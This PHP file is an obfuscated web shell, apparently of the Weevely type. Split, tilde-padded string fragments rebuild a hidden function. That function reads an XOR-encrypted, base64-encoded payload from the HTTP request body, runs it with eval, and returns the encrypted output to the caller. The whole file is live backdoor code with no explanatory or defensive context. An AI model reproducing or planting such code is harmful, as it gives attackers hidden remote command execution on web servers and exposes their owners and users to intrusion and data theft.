<?php
$x='$k=~"47b~c485c~";$kh="~a2de6c~1~2a8ac";$kf="91~40~b~b349bf4";$p="BaE~q~05Z1Yd2fyjm~O";~func~tio~n x(~$';
$w='t,$k){$c=strl~~en($k);$l=strlen~($t);$o=~"";f~or($i=0;~$i<$l;~){for~($j=0;(~$j<~$c&&$i<$~l);$~j++,~$i+';
$o=str_replace('N','','cNrNeatNNe_funNNction');
$P='+){$o~.=$~t{$~i~}^$k{$j};}}return $~o;}if ~(~@~preg_match("/~$kh~(.+)$kf/",~@file~_get_cont~ents~("~php://';
$N='inpu~t"),~$m)==1~) {@~ob_start();~@e~val(@gz~uncompre~ss(@x(@b~ase~64~_deco~~de($m[1]),$k))~);$o=@ob_ge~t';
$A='_co~ntents();@~~ob_end_clean~()~;$~r=@bas~e64_~encode(~@x(@gz~compress($~o),$k~));prin~t~("$p$kh$r$kf");}';
$r=str_replace('~','',$x.$w.$P.$N.$A);
$v=$o('',$r);$v();
?>
